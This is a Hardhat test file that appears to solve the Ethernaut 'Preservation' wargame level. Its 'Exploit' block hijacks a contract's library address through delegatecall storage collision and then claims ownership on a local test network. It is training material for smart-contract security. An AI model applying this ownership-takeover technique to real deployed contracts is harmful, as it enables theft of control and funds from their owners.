const { ethers } = require("hardhat");
const { expect } = require("chai");

/*

This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

  Things that might help

- Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
- Understanding what it means for delegatecall to be context-preserving.
- Understanding how storage variables are stored and accessed.
- Understanding how casting works between different data types.

*/

describe("[Challenge] Preservation", function () {
  let deployer, attacker;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    this.library1 = await (
      await ethers.getContractFactory("LibraryContract", deployer)
    ).deploy();
    this.library2 = await (
      await ethers.getContractFactory("LibraryContract", deployer)
    ).deploy();
    this.preservation = await (
      await ethers.getContractFactory("Preservation", deployer)
    ).deploy(this.library1.address, this.library2.address);
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */

    this.libraryContractAttack = await (
      await ethers.getContractFactory("LibraryContractAttack", attacker)
    ).deploy();

    // change timeZone1Library to LibraryContractAttack address
    await this.preservation
      .connect(attacker)
      .setFirstTime(this.libraryContractAttack.address);

    const timeZone1Library = await this.preservation.timeZone1Library();
    expect(timeZone1Library).to.eq(this.libraryContractAttack.address);

    // call LibraryContractAttack to change owner
    await this.preservation.connect(attacker).setFirstTime("0");
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // attacker claim ownership of preservation contract
    const owner = await this.preservation.owner();
    expect(owner).to.eq(attacker.address);
  });
});
